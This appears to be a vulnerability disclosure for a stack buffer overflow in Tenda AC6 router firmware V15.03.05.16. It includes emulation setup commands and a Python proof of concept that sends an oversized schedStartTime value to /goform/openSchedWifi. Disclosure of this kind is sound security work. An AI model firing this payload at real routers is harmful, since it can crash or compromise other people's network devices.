
-------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![image](https://github.com/user-attachments/assets/7772c8d2-54f0-4bcd-926c-445aeee977f2)


### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

Tenda AC6 **V15.03.05.16** has a stack overflow vulnerability. The vulnerability affects the file /goform/openSchedWifi function setSchedWifi. Setting the schedStartTime parameter causes a stack-based buffer overflow.

![image](https://github.com/user-attachments/assets/aae90b78-6ca7-410c-af4a-06962006904c)



![image](https://github.com/user-attachments/assets/1a1b19a4-2175-47c1-bfea-c9b1c35e7620)

### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/openSchedWifi"

data = {
    "schedWifiEnable": "Raining101",
    "schedStartTime": "Raining" * 2000 
}

response = requests.post(url, data=data)
print(response.status_code)
print(response.text)
```

![image](https://github.com/user-attachments/assets/a378cd22-4b93-4143-8e22-f54cda12bb60)


